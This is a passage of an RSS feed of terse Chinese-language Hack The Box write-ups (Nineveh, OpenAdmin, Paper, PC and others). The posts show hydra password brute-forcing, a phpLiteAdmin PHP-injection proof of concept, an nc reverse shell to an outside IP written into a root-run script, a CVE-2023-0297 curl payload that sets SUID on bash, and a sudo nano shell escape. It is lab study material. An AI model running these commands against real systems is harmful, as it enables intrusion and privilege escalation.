+&lt;li&gt;&lt;font style=&#34;color:#000000;&#34;&gt;使用&lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;nc&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt;命令将输出发送到地址&lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;10.10.14.7&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt;的端口&lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;8443&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt;。&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:#000000;&#34;&gt;将来自&lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;/tmp/f&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;font style=&#34;color:#000000;&#34;&gt;的输入写入标准输出。&lt;/font&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;| tee -a monitor.sh&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt;: 将接收到的字符串追加到 &lt;/font&gt;&lt;code&gt;&amp;lt;font style=&amp;quot;color:#000000;&amp;quot;&amp;gt;monitor.sh&amp;lt;/font&amp;gt;&lt;/code&gt;&lt;font style=&#34;color:#000000;&#34;&gt; &lt;/font&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;font style=&#34;color:#000000;&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:#000000;&#34;&gt;然后sudo &lt;/font&gt;/home/nibbler/personal/stuff/monitor.sh就可拿到root&lt;/p&gt;
+&lt;p&gt;echo &amp;lsquo;cp /bin/bash /tmp/3.sh&amp;rsquo; | tee /usr/sbin/proc_redis.sh&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(255, 255, 255);&#34;&gt;&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(255, 255, 255);&#34;&gt;&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(255, 255, 255);&#34;&gt;&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(255, 255, 255);&#34;&gt;&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(255, 255, 255);&#34;&gt;文件中，并同时显示在终端。&lt;/font&gt;&lt;/li&gt;
+&lt;li&gt;&lt;font style=&#34;color:rgb(255, 255, 255);&#34;&gt;然后&lt;/font&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Nineveh</title>
+        <link>https://example.com/htb/nineveh/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/nineveh/</guid>
+        <description>&lt;p&gt;学到了使用hydra爆破密码，&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hydra -l none -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form &amp;#34;/db/index.php:password=^PASS^&amp;amp;remember=yes&amp;amp;login=Log+In&amp;amp;proc_login=true:Incorrect password&amp;#34; -t 64 -V
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[443][http-post-form] host: 10.10.10.43   login: none   password: password123
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &amp;#34;/department/login.php:username=^USER^&amp;amp;password=^PASS^:Invalid&amp;#34; -t 64 -V
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Description:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;phpliteadmin.php#1784: &amp;#39;Creating a New Database&amp;#39; =&amp;gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;phpliteadmin.php#1785: &amp;#39;When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.&amp;#39;,
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Proof of Concept:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1. We create a db named &amp;#34;hack.php&amp;#34;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(Depending on Server configuration sometimes it will not work and the name for the db will be &amp;#34;hack.sqlite&amp;#34;. Then simply try to rename the database / existing database to &amp;#34;hack.php&amp;#34;.)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The script will store the sqlite database in the same directory as phpliteadmin.php.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Preview: http://goo.gl/B5n9O
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hex preview: http://goo.gl/lJ5iQ
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2. Now create a new table in this database and insert a text field with the default value:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php phpinfo()?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hex preview: http://goo.gl/v7USQ
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3. Now we run hack.php
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Done!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里有个点拿到reshell&lt;/p&gt;
+&lt;p&gt;进入后扫进程看到靶机使用了&lt;/p&gt;
+&lt;h1 id=&#34;chkrootkit&#34;&gt;Chkrootkit
+&lt;/h1&gt;&lt;p&gt;存在0.49以下的版本漏洞&lt;/p&gt;
+&lt;p&gt;创建/tmo/update文件&lt;/p&gt;
+&lt;p&gt;文件里可以执行root权限的命令&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Obscurity</title>
+        <link>https://example.com/htb/obscurity/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/obscurity/</guid>
+        <description>&lt;p&gt;fuzz爆出develop目录看源码&lt;/p&gt;
+&lt;p&gt;分析源码利用exec语句构造playload&lt;/p&gt;
+&lt;p&gt;提权时查看rebor用户目录下的py文件&lt;/p&gt;
+&lt;p&gt;提权root时&lt;/p&gt;
+&lt;p&gt;sudo -l 查看&lt;/p&gt;
+&lt;p&gt;sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py&lt;/p&gt;
+&lt;p&gt;这个文件是暂时读取etc/shadow文件复制到/tmp/SSH中&lt;/p&gt;
+&lt;p&gt;利用方式&lt;/p&gt;
+&lt;p&gt;一写一个脚本实时复制/tmp/SSH文件&lt;/p&gt;
+&lt;p&gt;二&lt;/p&gt;
+&lt;p&gt;我们可以重命名BetterSSH文件夹&lt;/p&gt;
+&lt;p&gt;然后自己建一个BetterSSH文件夹和提权py文件&lt;/p&gt;
+&lt;p&gt;然后运行&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>OpenAdmin</title>
+        <link>https://example.com/htb/openadmin/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/openadmin/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口22,80&lt;/p&gt;
+&lt;p&gt;打开网页没有东西，dirsearch,gobuster扫到/ona，一个后台管理网站&lt;/p&gt;
+&lt;p&gt;直接给了版本18.1.1网上搜索poc&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;python test.py exploit &amp;ldquo;http://10.10.10.171/ona&amp;rdquo;(网站要用双引号)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;利用成功，在里面的mysql配置里拿到了密码&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/openadmin/1724249707449-23503510-a779-4416-9348-c9c96b307fef.png&#34;
+	width=&#34;1688&#34;
+	height=&#34;1075&#34;
+	srcset=&#34;https://example.com/htb/openadmin/1724249707449-23503510-a779-4416-9348-c9c96b307fef_huf767aa3cafdcf37be1b35d7a88fb23bb_217940_480x0_resize_box_3.png 480w, https://example.com/htb/openadmin/1724249707449-23503510-a779-4416-9348-c9c96b307fef_huf767aa3cafdcf37be1b35d7a88fb23bb_217940_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;157&#34;
+		data-flex-basis=&#34;376px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;配合curl反弹拿到了shell&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;使用上面发现的密码**n1nj4W4rri0R!**能从用户提升到jimmy&lt;/p&gt;
+&lt;h2 id=&#34;jimmy-joanna&#34;&gt;jimmy-&amp;gt;joanna
+&lt;/h2&gt;&lt;p&gt;netstat -an查看网络连接的状态&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/openadmin/1724332281784-1261c25d-8fa8-46b8-a3bc-bb3eaab580c6.png&#34;
+	width=&#34;1577&#34;
+	height=&#34;779&#34;
+	srcset=&#34;https://example.com/htb/openadmin/1724332281784-1261c25d-8fa8-46b8-a3bc-bb3eaab580c6_hu53495a3490f8fea18df9adbe6f04f97e_260297_480x0_resize_box_3.png 480w, https://example.com/htb/openadmin/1724332281784-1261c25d-8fa8-46b8-a3bc-bb3eaab580c6_hu53495a3490f8fea18df9adbe6f04f97e_260297_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;202&#34;
+		data-flex-basis=&#34;485px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到本地网站的52846有一个网页挂着，去到网页的默认目录/var/www看看情况&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/openadmin/1724332361830-7d74f418-db68-45b9-9924-a174707e63eb.png&#34;
+	width=&#34;1361&#34;
+	height=&#34;804&#34;
+	srcset=&#34;https://example.com/htb/openadmin/1724332361830-7d74f418-db68-45b9-9924-a174707e63eb_hu639119d9e3f9d036e3ecf8a8c669c149_221090_480x0_resize_box_3.png 480w, https://example.com/htb/openadmin/1724332361830-7d74f418-db68-45b9-9924-a174707e63eb_hu639119d9e3f9d036e3ecf8a8c669c149_221090_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;406px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;cat main.php中可以读代码知道打开这个网页能读到joanna的ssh密钥&lt;/p&gt;
+&lt;p&gt;curl 127.0.0.1:52846/main.php拿到密钥&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/openadmin/1724332480587-a5a633fb-1595-4319-9e4a-0f3ad6ca6e9f.png&#34;
+	width=&#34;1323&#34;
+	height=&#34;1177&#34;
+	srcset=&#34;https://example.com/htb/openadmin/1724332480587-a5a633fb-1595-4319-9e4a-0f3ad6ca6e9f_huc21f68e2a20054cb6ce957cd55d04abc_551311_480x0_resize_box_3.png 480w, https://example.com/htb/openadmin/1724332480587-a5a633fb-1595-4319-9e4a-0f3ad6ca6e9f_huc21f68e2a20054cb6ce957cd55d04abc_551311_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;112&#34;
+		data-flex-basis=&#34;269px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这是一个私钥。需要解密&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;**ssh2john**&lt;/code&gt; 是John the Ripper 工具的一部分，专门用于将 SSH 密钥文件转换为适合 John the Ripper 破解的哈希文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh2john joanna.key &amp;gt; joanna-key.hash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;然后john破解得到密钥bloodninjas&lt;/p&gt;
+&lt;p&gt;配合密钥文件一起ssh登录joanna用户&lt;/p&gt;
+&lt;h2 id=&#34;joanna-root&#34;&gt;joanna-&amp;gt;root
+&lt;/h2&gt;&lt;p&gt;sudo -l&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/openadmin/1724334697487-caa0b3f2-7ade-4e3c-bd41-3892c1dfa765.png&#34;
+	width=&#34;1186&#34;
+	height=&#34;388&#34;
+	srcset=&#34;https://example.com/htb/openadmin/1724334697487-caa0b3f2-7ade-4e3c-bd41-3892c1dfa765_hufbc7fe9731a532763da962fbf19d2dc8_71196_480x0_resize_box_3.png 480w, https://example.com/htb/openadmin/1724334697487-caa0b3f2-7ade-4e3c-bd41-3892c1dfa765_hufbc7fe9731a532763da962fbf19d2dc8_71196_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;305&#34;
+		data-flex-basis=&#34;733px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;sudo nano去编辑/opt/priv文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CTRL+R
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CTRL+X
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ENTER
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;会得到一个伪shell（root）&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Paper</title>
+        <link>https://example.com/htb/paper/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/paper/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口22,80,443&lt;/p&gt;
+&lt;p&gt;80，443打开发现是个appech&lt;/p&gt;
+&lt;p&gt;查看网页字段头发现主机名&lt;/p&gt;
+&lt;p&gt;office.paper&lt;/p&gt;
+&lt;p&gt;打开这个主机，发现是wordpress&lt;/p&gt;
+&lt;p&gt;查看版本是5.2.3，发现有个cve查看秘密信息，&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/paper/1726060609920-1f59b493-57a1-48ff-8ce7-d22b300981d1.png&#34;
+	width=&#34;1760&#34;
+	height=&#34;872&#34;
+	srcset=&#34;https://example.com/htb/paper/1726060609920-1f59b493-57a1-48ff-8ce7-d22b300981d1_hu482469ae7d0a97a0eefcd1c3491f4e74_1443623_480x0_resize_box_3.png 480w, https://example.com/htb/paper/1726060609920-1f59b493-57a1-48ff-8ce7-d22b300981d1_hu482469ae7d0a97a0eefcd1c3491f4e74_1443623_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;201&#34;
+		data-flex-basis=&#34;484px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;又知道一个域名，打开这个域名后发现有个聊天群，里面有个机器人可以查看文件&lt;/p&gt;
+&lt;p&gt;利用这点查看这个机器人的环境变量&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/paper/1726060681106-e0d8d0ea-9669-47a9-94e9-f09293bab092.png&#34;
+	width=&#34;1433&#34;
+	height=&#34;435&#34;
+	srcset=&#34;https://example.com/htb/paper/1726060681106-e0d8d0ea-9669-47a9-94e9-f09293bab092_hub75a26f9b4e6f93d280681a9a6379c42_86444_480x0_resize_box_3.png 480w, https://example.com/htb/paper/1726060681106-e0d8d0ea-9669-47a9-94e9-f09293bab092_hub75a26f9b4e6f93d280681a9a6379c42_86444_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;329&#34;
+		data-flex-basis=&#34;790px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);&#34;&gt;recyclops file ../../../../../proc/self/environ&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);&#34;&gt;拿到ssh账号密码登录&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/paper/1726060737544-fb4732a4-92c8-4756-9dd5-4f4146322b36.png&#34;
+	width=&#34;1489&#34;
+	height=&#34;764&#34;
+	srcset=&#34;https://example.com/htb/paper/1726060737544-fb4732a4-92c8-4756-9dd5-4f4146322b36_huf7ce9fd4baf72e150dbe03291c30be3a_138476_480x0_resize_box_3.png 480w, https://example.com/htb/paper/1726060737544-fb4732a4-92c8-4756-9dd5-4f4146322b36_huf7ce9fd4baf72e150dbe03291c30be3a_138476_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;194&#34;
+		data-flex-basis=&#34;467px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;dwight，Queenofblad3s!23&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;h2 id=&#34;从dwight-root&#34;&gt;从dwight-&amp;gt;root
+&lt;/h2&gt;&lt;p&gt;用最新的linpeas.sh扫描&lt;/p&gt;
+&lt;p&gt;发现sudo 1.8.29版本&lt;/p&gt;
+&lt;p&gt;搜索得知存在&lt;font style=&#34;color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);&#34;&gt;CVE-2021-3560&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;使用poc拿到root&lt;/p&gt;
+&lt;p&gt;echo &amp;rsquo;nc%208.219.57.114%202333%20-e%20sh&amp;rsquo; &amp;gt;/usr/sbin/proc_redis.sh&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Passage</title>
+        <link>https://example.com/htb/passage/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/passage/</guid>
+        <description>&lt;p&gt;网页模板为CuteNews2.1.2&lt;/p&gt;
+&lt;p&gt;有poc&lt;/p&gt;
+&lt;p&gt;使用进入弹shell&lt;/p&gt;
+&lt;p&gt;然后linpeash.sh扫到适合pwnkit&lt;/p&gt;
+&lt;p&gt;使用脚本得到root&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>PC</title>
+        <link>https://example.com/htb/pc/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/pc/</guid>
+        <description>&lt;p&gt;扫端口到50002&lt;/p&gt;
+&lt;p&gt;弱口令登录拿到token&lt;/p&gt;
+&lt;p&gt;id注入sqlmap拿到ssh账号密码&lt;/p&gt;
+&lt;p&gt;之后root提权有点懵&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt;curl -i -s -k -X $&lt;/font&gt;&lt;font style=&#34;color:rgb(196, 26, 22);background-color:rgb(249, 249, 249);&#34;&gt;&amp;lsquo;POST&amp;rsquo;&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt; &amp;ndash;data-binary $&lt;/font&gt;&lt;font style=&#34;color:rgb(196, 26, 22);background-color:rgb(249, 249, 249);&#34;&gt;&amp;lsquo;jk=pyimport%20os;os.system(&amp;quot;chmod%20u%2Bs%20%2Fbin%2Fbash&amp;quot;);f=function%20f2(){};&amp;amp;package=xxx&amp;amp;crypted=AAAA&amp;amp;&amp;amp;passwords=aaaa&amp;rsquo;&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt; $&lt;/font&gt;&lt;font style=&#34;color:rgb(196, 26, 22);background-color:rgb(249, 249, 249);&#34;&gt;&amp;lsquo;http://127.0.0.1:8000/flash/addcrypted2&amp;rsquo;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(164, 177, 205);background-color:rgb(20, 29, 43);&#34;&gt;CVE-2023-0297&lt;/font&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>perfection</title>
+        <link>https://example.com/htb/perfection/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/perfection/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
